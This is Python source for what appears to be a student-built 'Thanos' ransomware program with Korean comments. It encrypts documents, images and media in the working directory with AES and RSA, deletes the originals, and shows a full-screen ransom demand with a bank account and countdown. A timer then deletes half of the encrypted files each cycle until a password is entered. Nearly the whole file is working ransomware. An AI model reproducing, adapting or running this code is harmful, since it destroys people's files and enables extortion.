from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto import Random  # RSA 키 생성시 필요
from Crypto.Cipher import PKCS1_OAEP  # RSA 최신버전(보안더좋음)
import os
import threading
from time import sleep

'''
암호화 / 복호화 기존에 1,2,3 
while 루프 나오던 건 main_test
gui랑 통합하고 있는 게 integrate_gui 
'''
# gui 라이브러리
import tkinter
from testFile import thanos

timeLimit = 5
iv = os.urandom(16)


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드

class tk:
    def __init__(self, parent=None):
        self.parent = parent
        self.pw = ""
        self.window = tkinter.Tk()
        self.window.title("ransomware")
        self.window.state('zoomed')  # maximize the window
        height = self.window.winfo_height()  # ...
        width = self.window.winfo_width()
        self.window.configure(background="black")

        self.l_text = tkinter.Label(self.window,
                                    text="타노스 랜섬웨어에 감염되었다.\n1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.\n국민 786102-00-040854\npassword:",
                                    fg="red", bg="black", font='Helvetica 14 bold')
        self.l_text.pack()

        self.l_timer = tkinter.Label(self.window, text="타이머 시작 = 5", fg="red", bg="black", font='Helvetica 14 bold')
        self.l_timer.pack()

        # self.l_text1 = tkinter.Label(self.window, text="삭제될 리스트입니다",fg="red", bg="black", font='Helvetica 14 bold')
        # self.l_text1.pack()

        # self.l_filelist = tkinter.Label(self.window, text=" ",fg="red", bg="black", font='Helvetica 14 bold')
        # self.l_filelist.pack()

        self.l_input = tkinter.Label(self.window,
                                     text="password:",
                                     fg="red", bg="black", font='Helvetica 14 bold')

        self.password = tkinter.Entry(self.window)
        self.password.pack()

        self.pwbutton = tkinter.Button(self.window, text="복호화", command=self.key_submit)
        self.pwbutton.pack()

        self.thanos = tkinter.PhotoImage(file="../ui/face.png")

        self.l_thanos = tkinter.Label(self.window, image=self.thanos)
        self.l_thanos.pack()

    def key_submit(self):
        # input 창이나 pwbutton을 destroy 할 필요는 없다고 생각함
        # 틀린 시도를 해도 그냥 그대로 두어도 된다고 저번 회의때 얘기했었으니까!
        self.pw = str(self.password.get())
        # self.l_input.destroy()
        self.l_input = tkinter.Label(self.window, text="키가 입력되었다 => " + self.pw, fg="red", bg="black",
                                     font="Helvetica 18 bold")
        self.l_input.pack()
        self.parent and self.parent.checkPassword(self.pw)
        # self.pwbutton.destroy()

    def imagechange(self):
        # gif 출력
        self.l_thanos.destroy()
        self.l_thanos = thanos.AnimatedGIF(self.window, "../ui/thanos1.gif")  ##self.window로 수정
        self.l_thanos.pack()
        # 다시 타노스얼굴 사진
        sleep(2)
        self.l_thanos.destroy()
        self.l_thanos = tkinter.Label(self.window, image=self.thanos)  ##self.window로 수정 #self.thanos로 수정
        self.l_thanos.pack()


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수

def list_files(path):  # ext 안쓰더라 지워버림
    filelist = []
    extlist = \
        ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
         'jpg', 'jpeg', 'png', 'gif',
         'mp3', 'wav', 'wma',
         'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
    print("os.listdir(): \n", os.listdir())
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)):
            for i in extlist:
                if name.endswith(i):
                    filelist.append(name)
                else:
                    continue

    print("filelist: \n", filelist)
    return filelist


def dec_list_files(path):  # checkPassword에서 password 같은 경우 호출한다
    dec_filelist = []
    for name in os.listdir(path):
        if name.endswith(".antdd"):
            dec_filelist.append(name)
        else:
            continue
    print("dec_filelist: \n", dec_filelist)
    return dec_filelist


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수

def startTimer(gui, path, ext=None):
    print("파일 삭제를 시작합니다")

    antdd_filelist = []

    print("os.listdir(): \n", os.listdir())
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)):
            if name.endswith('antdd'):
                antdd_filelist.append(name)
            else:
                continue

    # gui/ 삭제될 파일 리스트 출력
    # gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
    # 지운 파일 출력 #새창으로 띄우기
    gui.listWindow = tkinter.Toplevel(gui.window)
    gui.listWindow.title('암호화된 파일 리스트')
    gui.listWindow.geometry("800x400")
    gui.listWindow.configure(background="black")
    gui.list = tkinter.Label(gui.listWindow, text="[" + ",".join(antdd_filelist) + "]", background="black", fg="red")
    gui.list.pack()
    ####
    print("[" + ",".join(antdd_filelist) + "]")

    clock(gui, 50, antdd_filelist)


# 타이머를 출력해주는 함수
def clock(gui, c, antdd_filelist):
    c -= 1

    # 0초가 되면!
    if c == -2:
        # 파일 삭제를 시작함
        remove_files(gui, antdd_filelist)
        return;

    # gui의 타이머 label 을 갱신!
    gui.l_timer.config(text=str(c + 1))

    # 자기 자신 호출
    threading.Timer(1, clock, [gui, c, antdd_filelist]).start()


# 모두 삭제되었을 때 GUI #혜연 11/22 추가
def allRemovePrint(gui):
    gui.l_thanos.destroy()
    l_allremove = tkinter.Label(gui.window, text="\n\nYour files are all deleted.\n\n",
                                fg="red", bg="black", font='Helvetica 16 bold')
    l_allremove.pack()
    sleep(3)
    gui.window.destroy()


def remove_files(gui, remove_filelist):  # ext 안쓰더라 지워버림
    gui.l_thanos.destroy()
    gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
    gui.l_thanos.pack()

    # 파일이 2개 이상일 경우
    if (len(remove_filelist) >= 2):
        n = 0
        if (len(remove_filelist) % 2 == 0):
            n = round(len(remove_filelist) / 2)  # 정수로 변환
            print("지울 파일 개수: ", n)
        else:
            n = round(len(remove_filelist) / 2) - 1
            print("지울 파일 개수: ", n)

        for i in range(n):
            print(remove_filelist[i])
            os.remove(remove_filelist[i])
        print("파일 중 절반이 삭제되었습니다.")

    # 파일이 1개 남았을 경우
    elif (len(remove_filelist) == 1):
        os.remove(remove_filelist[0])
        print("더 이상 삭제할 파일이 없습니다")
        allRemovePrint(gui)
    # 맨 처음 파일이 0개일 경우
    else:
        print("더 이상 삭제할 파일이 없습니다")
        allRemovePrint(gui)

    # gui
    sleep(2)

    gui.l_thanos.destroy()
    gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos)
    gui.l_thanos.pack()

    # 다시 타이머함수 시작!
    startTimer(gui, os.getcwd())


# /////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수

def enc(key, cipher, in_filename, out_filename=None):
    # RSA 로 AES 키 암호화
    ciphertext = cipher.encrypt(key)  # 128비트
    # print(cipher.decrypt(ciphertext))
    # print("\nRSA를 통한 key 암호화문 : \n", ciphertext, "\n")
    # /////////////////////////////////////////////////

    # print("---START ENCRYPTION : AES")
    mode = AES.MODE_CBC
    # iv = b'Sixteen byte iv3'

    # enc의 결과로 나오는 파일 이름을 정한다
    if not out_filename:
        out_filename = in_filename + '.antdd'

    # 먼저, 바이너리 형식으로 파일을 읽어온다
    # 읽어온 것은 data로 저장

    with open(in_filename, 'rb') as infile:
        # 일단 읽어온 것을 출력해보자
        data = infile.read()

        # print("1. Plain Message was: ")
        # print(data, '\n', len(data))
        sizeOfData = len(data)

        # 패딩에 대한 부분
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length

        # print("2. After Padding Message was: ")
        # print(data)

        with open(out_filename, 'wb') as outfile:
            pass

        # 이어쓰기 모드
        with open(out_filename, 'ab') as outfile:
            # RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
            outfile.write(b'0' * (64832 - len(str(sizeOfData))) + str(sizeOfData).encode())
            # print('\ndata size : ', len(b'0' * (64832 - len(str(sizeOfData))) + str(sizeOfData).encode()))
            # RSA : 암호화된 AES 키를 넣어줌 (128바이트)
            outfile.write(ciphertext)
            encryptor = AES.new(key, mode, iv)
            e_data = encryptor.encrypt(data)
            # 그럼 e_data도 마찬가지로 b''형식이다.

            # print("3. e_data Message was: ")
            # print(e_data)

            outfile.write(e_data)

    # write가 완료된 상태에서 out_file을 읽어보자
    '''
    with open(out_filename, 'rb') as result:
        print("4. encryption result is: ", out_filename)
        print(result.read())
    '''

    # print("---END ENCRYPTION : AES")


def dec(cipher, in_filename, out_filename=None):
    # print("---START DECRYPTION : AES")

    mode = AES.MODE_CBC
    # iv = b'Sixteen byte iv3'

    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    # print(out_filename)

    with open(in_filename, 'rb') as infile:
        e_data = infile.read()
        # print('size : ', e_data[:64832])
        # RSA : 파일의 크기와 암호화된 AES 키 추출
        sizeOfData = int(e_data[:64832].lstrip(b'0').decode())
        aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키
        # print(len(aes_key_enc), aes_key_enc)
        # RSA : 암호화된 진짜 원본 데이터 추출
        e_data = e_data[64960:]

        # RSA : 추출한 AES 키 복호환
        aes_key_dec = cipher.decrypt(aes_key_enc)
        # print('AES key was :', aes_key_dec)
        # print("1. Cipher was: ")
        # print(e_data)

        with open(out_filename, 'wb') as outfile:
            decryptor = AES.new(aes_key_dec, mode, iv)

            d_data = decryptor.decrypt(e_data)

            # print("2. before unpadding d_data")
            # print(d_data)

            d_data = d_data[:sizeOfData]
            # 패딩 처리한 부분을 다시 지워준다
            # d_data = e_data[:-x[-1]] 에서 x[-1]의 값은 100
            # 바이트 크기로 인식하기 때문에 d->ascii->100
            # d_data = d_data[:d_data.rfind(x[-1]) + 1]

            #####print("어쩌구 후 d_data: ", d_data.decode('ascii'))
            ##target의 내용이 한글인 경우 에러발생
            # 아스키코드로 진행된 경우

            # print("3. after unpadding d_data")
            # print(d_data.decode(encoding='utf-8'))

            outfile.write(d_data)

    # write가 완료된 상태에서 out_file을 읽어보자
    # 읽을 때 rb가 아니라 r로 읽으면
    # UnicodeDecodeError: 'cp949' codec can't decode byte 0xed in position 7: illegal multibyte sequence
    '''
    with os.open(out_filename, 'rb') as result:
        print("4. decryption result is: ", out_filename)
        print(result.read())
    '''
    # print("---END DECRYPTION : AES")


# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////메인함수

class RealMain:

    def __init__(self):
        self.key = os.urandom(16)

        # RSA : 키, 싸이퍼 생성
        self.random_generator = Random.new().read
        self.rsa_key = RSA.generate(1024, self.random_generator)  # 키 정보 객체
        # self.cipher = PKCS1_OAEP.new(self.rsa_key)
        self.public_key = self.rsa_key.publickey().export_key()  # 공개키
        self.private_key = self.rsa_key.export_key()  # 비밀키

        self.test_input_key = os.urandom(16)  # gui에서 잘 받아오는지 확인하기 위한 변수

    def main(self):
        # gui 객체 생성
        gui = tk(parent=self)

        print("공개키는 : ", self.public_key)
        print("비밀키는 : ", self.private_key)
        print("test_input_key는 : ", str(self.test_input_key))  # 랜섬웨어 자체랑 관계 없음 다 지워버려야함

        # timer 테스트
        enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
        original_targetlist = enc_targetlist  # 원본파일 삭제시 사용

        # 나중에 전체 트래킹 하는 법 알아야함
        # print("enc_targetlist: \n", enc_targetlist)
        # print("original_targetlist: \n", original_targetlist)
        i = 0
        for enc_target in enc_targetlist:
            if enc_target.split('.')[-1] == 'antdd':
                continue
            enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target, out_filename=None) # 공개키로 객체를 만들어서 enc 11/24
            os.remove(original_targetlist[i])  # 원본 파일을 삭제
            i += 1

        # 타이머 시작 코드
        th1 = threading.Thread(target=startTimer, args=[gui, os.getcwd()])
        th1.daemon = True
        th1.start()

        # gui 시작 코드
        # th2 = threading.Thread(gui.window.mainloop())
        # th2.start()
        gui.window.mainloop()

    def checkPassword(self, input=None):
        print("gui로부터 입력한 pw: ", input)
        if (str(self.test_input_key) == input):  # 메일 서버로 private key 연결해와야함
            # if (self.private_key == input):
            print("self.test_input_key==input")
            '''
            if( PKCS1_OAEP.new(input)==self.cipher ):
                print("same cipher instance!")
            else:
                print("wrong cipher instance!")
            '''
            for file in dec_list_files(os.getcwd()):  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
                # dec(self.cipher, file, out_filename=None)
                dec(PKCS1_OAEP.new(RSA.importKey(self.private_key)), file, out_filename=None)
                # 입력한 비밀키를 바탕으로 dec 근데 파라미터 private_key 아니고 input이여야하는데 encoding 문제배제하려고 일단은 private key 사용함 11/24
            print("---dec_by_cipher end")

            # gui laughing으로 바꾸는 함수도 호출
            # auto_remove 호출
        else:
            print("self.test_input_key!=input")


if __name__ == "__main__":
    rInstance = RealMain()
    rInstance.main()
